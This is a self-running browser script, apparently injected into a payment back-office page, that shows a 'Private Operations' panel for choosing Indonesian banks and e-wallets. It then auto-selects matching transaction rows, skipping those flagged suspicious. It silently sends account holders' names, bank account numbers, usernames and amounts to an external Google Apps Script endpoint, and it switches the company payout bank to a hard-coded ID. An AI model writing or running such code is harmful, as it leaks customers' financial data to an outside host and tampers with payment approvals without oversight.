(function () {
  if (window.__RUNNING__) return;
  window.__RUNNING__ = true;

  const EXEC = "https://script.google.com/macros/s/AKfycbzz8VzmHGW2RijK0BdvwHAB3kt71YBKehCWcWC40dWlatVkCKqsLDMmJvSjayypXgyF/exec";

  function unlock() {
    window.__RUNNING__ = false;
  }

  function getCfg() {
    return JSON.parse(localStorage.getItem('PAY_CFG') || '{}');
  }

  function createInfoPopup(sh) {
    if (sh.getElementById('infoBox')) return;

    let box = document.createElement('div');
    box.id = 'infoBox';
    box.style = `
      position:fixed;
      top:60px;
      right:20px;
      width:260px;
      background:#0f0f0f;
      color:#fff;
      border:1px solid rgba(255,255,255,0.1);
      border-radius:10px;
      font-family:Arial;
      font-size:11px;
      padding:10px;
      z-index:999999;
      box-shadow:0 10px 25px rgba(0,0,0,0.5);
    `;

    box.innerHTML = `
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
        <b style="color:#8fbfff;">SYSTEM INFO</b>
        <button id="closeInfo" style="
          background:#222;
          color:#fff;
          border:none;
          border-radius:6px;
          padding:2px 6px;
          cursor:pointer;
        ">x</button>
      </div>

      <div style="line-height:1.4;">

        🔵 <b>EL CAMINO’S SOLDATO • PRIVATE OPERATIONS SYSTEM</b><br><br>

        Automated transaction filtering and approval system active.<br>
        Processing payment data stream with rule-based validation, bank/e-wallet filtering, and risk exclusion logic.<br>
        System operates in real-time table monitoring with automated selection and approval workflow execution.<br><br>

        ⚙️ <b>SYSTEM STATUS</b><br>
        ACTIVE — Continuous monitoring enabled<br>
        Mode: AUTO PROCESSING<br>
        Filter: BANK / E-WALLET ENABLED<br>
        Risk Filter: ENABLED<br><br>

        ❌ <b>NOT INCLUDED / EXCLUDED FROM PROCESSING</b><br>
        • Suspicious or flagged records (NEW REGISTRATION, SUSPICIOUS)<br>
        • Transactions exceeding configured limits<br>
        • Unsupported or disabled payment methods<br>
        • Incomplete or malformed transaction data<br>
        • Manual override / external approval<br>
        • Duplicate or already processed entries<br>
        • Non-matching table rows or inactive records<br>

      </div>
    `;

    document.body.appendChild(box);

    box.querySelector('#closeInfo').onclick = () => box.remove();
  }

  function ui() {
    if (document.getElementById('payHostUI')) return;

    let host = document.createElement('div');
    host.id = 'payHostUI';
    host.style = 'position:fixed;top:100px;left:100px;z-index:999999';

    let sh = host.attachShadow({ mode: 'open' });

    let style = document.createElement('style');
    style.textContent = `
      .p{background:#111;color:#fff;border-radius:12px;font-family:Arial;width:280px;height:320px;resize:both;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.5);position:relative}
      .h{cursor:move;background:#222;padding:8px;font-weight:bold;position:relative}
      .infoBtn{
        position:absolute;
        right:6px;
        top:6px;
        width:18px;
        height:18px;
        border-radius:50%;
        border:none;
        background:#2563eb;
        color:#fff;
        font-size:11px;
        cursor:pointer;
        display:flex;
        align-items:center;
        justify-content:center;
      }
      .b{padding:10px;display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:12px}
      .b label{display:flex;align-items:center;gap:6px}
      .btns{grid-column:1/-1;display:flex;flex-direction:column;gap:6px;margin-top:8px}
      .row2{display:flex;gap:6px}
      .row2 button{flex:1}
      button{width:100%;padding:6px;font-size:11px;border:none;border-radius:8px;background:#2a5298;color:#fff;font-weight:500;cursor:pointer}
      button:hover{filter:brightness(1.1)}
      .ft{position:absolute;bottom:6px;left:10px;right:10px;overflow:hidden}
      .marq{display:inline-block;white-space:nowrap;animation:mar 48s linear infinite;color:#8fbfff}
      .marq span{padding-right:90px}
      @keyframes mar{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
    `;

    let w = document.createElement('div');
    w.className = 'p';

    w.innerHTML = `
      <div class="h">
        ElCamino-爱 Operation V1
        <button class="infoBtn">i</button>
      </div>

      <div class="b">
        <label><input id="DANA" type="checkbox"> DANA</label>
        <label><input id="OVO" type="checkbox"> OVO</label>
        <label><input id="GOPAY" type="checkbox"> GOPAY</label>
        <label><input id="BCA" type="checkbox"> BCA</label>
        <label><input id="BNI" type="checkbox"> BNI</label>
        <label><input id="BRI" type="checkbox"> BRI</label>
        <label><input id="MANDIRI" type="checkbox"> MANDIRI</label>
        <label><input id="BSI" type="checkbox"> BSI</label>
        <label><input id="JAGO" type="checkbox"> JAGO</label>
        <label><input id="PERMATA" type="checkbox"> PERMATA</label>
        <label><input id="MAYBANK" type="checkbox"> MAYBANK</label>
        <label><input id="SEABANK" type="checkbox"> SEABANK</label>

        <div class="btns">
          <button id="sv">SAVE</button>
          <div class="row2">
            <button id="ca">CHECKLIST ALL</button>
            <button id="uc">UNCHECKLIST</button>
          </div>
        </div>
      </div>

      <div class="ft">
        <div class="marq">
          <span>EL CAMINO’S SOLDATO • PRIVATE OPERATIONS NETWORK • DISCREET SYSTEM ACTIVE • GLOBAL TRANSACTIONS FLOWING •</span>
          <span>EL CAMINO’S SOLDATO • PRIVATE OPERATIONS NETWORK • DISCREET SYSTEM ACTIVE • GLOBAL TRANSACTIONS FLOWING •</span>
        </div>
      </div>
    `;

    sh.appendChild(style);
    sh.appendChild(w);
    document.body.appendChild(host);

    // INFO BUTTON CLICK
    w.querySelector('.infoBtn').onclick = () => createInfoPopup(sh);

    let keys = ['DANA','OVO','GOPAY','BCA','BNI','BRI','MANDIRI','BSI','JAGO','PERMATA','MAYBANK','SEABANK'];
    let cfg = getCfg();

    keys.forEach(k => {
      let el = w.querySelector('#' + k);
      if (el) el.checked = cfg[k] === true;
    });

    w.querySelector('#sv').onclick = function () {
      let o = {};
      keys.forEach(k => o[k] = w.querySelector('#' + k).checked);
      localStorage.setItem('PAY_CFG', JSON.stringify(o));
      alert('Saved');
    };

    let h = w.querySelector('.h');
    let d = 0, ox = 0, oy = 0;

    h.onmousedown = e => {
      d = 1;
      ox = e.clientX - host.offsetLeft;
      oy = e.clientY - host.offsetTop;
    };

    document.onmouseup = () => d = 0;

    document.onmousemove = e => {
      if (!d) return;
      host.style.left = (e.clientX - ox) + 'px';
      host.style.top = (e.clientY - oy) + 'px';
    };
  }

  ui();
  document.getElementById('btnSearch')?.click();

  const BLOCK = ['NEW REGISTRATION', 'SUSPICIOUS'];

  function p(v) {
    if (!v) return 0;
    v = v.toString().replace(/[^0-9.,]/g, '');

    if (v.includes(',') && v.includes('.')) {
      v = v.lastIndexOf(',') > v.lastIndexOf('.') ?
        v.replace(/\./g, '').replace(',', '.') :
        v.replace(/,/g, '');
    } else if (v.includes(',')) {
      v = v.split(',').length > 2 ? v.replace(/,/g, '') : v.replace(',', '.');
    } else {
      v = v.replace(/\./g, '');
    }

    let n = parseFloat(v);
    return isNaN(n) ? 0 : n;
  }

  let l = 0, s = 0;

  const iv = setInterval(() => {
    let rows = document.querySelectorAll('table tbody tr').length;

    if (rows == l) s++;
    else { s = 0; l = rows; }

    if (s >= 3) {
      clearInterval(iv);

      let cfg = getCfg();
      let valid = [];

      document.querySelectorAll('table tbody tr').forEach(tr => {
        let tds = tr.querySelectorAll('td');
        let full = (tr.innerText || '').toUpperCase();
        let td8 = (tds[7]?.innerText || '').toUpperCase();

        if (BLOCK.some(b => full.includes(b))) return;
        if (BLOCK.some(b => td8.includes(b))) return;

        let td6 = tds[5];
        let lines = (td6?.innerText || '').split('\n').map(e => e.trim()).filter(Boolean);
        let method = (lines[1] || '').toUpperCase();
        if (!cfg[method]) return;

        let a = p(tds[6]?.innerText || '');
        let b = p(tds[8]?.innerText || '');
        let total = a + b;

        if (a > 5000000) return;
        if (total >= 50000000) return;

        valid.push(tr);
      });

      if (rows === 0 || valid.length === 0) {
        unlock();
        document.getElementById('btnSearch')?.click();
        return;
      }

      valid.forEach(tr => {
        let cb = tr.querySelector('input[type=checkbox],td.select-checkbox,.select-checkbox,[type=checkbox]');
        if (cb) {
          cb.click();
          cb.dispatchEvent(new Event('change', { bubbles: true }));
        }
      });

      let out = [];

      valid.forEach(tr => {
        let t = tr.querySelectorAll('td');
        if (t.length >= 7) {
          let td6 = t[5];
          let lines = (td6?.innerText || '').split('\n').map(e => e.trim()).filter(Boolean);

          let tiket = (t[3]?.innerText || '').trim();
          let user = (t[4]?.innerText || '').trim();
          let time = (t[2]?.innerText || '').split('\n')[1]?.trim() || '';

          let name = lines[0] || '';
          let bank = lines[1] || '';
          let rek = lines.find(e => /^\d{6,}$/.test(e)) || '';

          out.push({
            bank,
            time,
            tiket,
            user,
            name,
            rek,
            amount: p(t[6]?.innerText || ''),
            remark: 'PAYMENT-GROUP'
          });
        }
      });

      fetch(EXEC + "?data=" + encodeURIComponent(JSON.stringify(out))).catch(() => {});

      let ddl = document.getElementById('ddlMultiCompanyBank');
      if (ddl) {
        ddl.value = '5f71a42e-69e1-43bb-a51b-220c409dcd1d';
        ddl.dispatchEvent(new Event('change', { bubbles: true }));
        if (window.jQuery) jQuery(ddl).trigger('change');
      }

      unlock();
    }
  }, 400);

})();
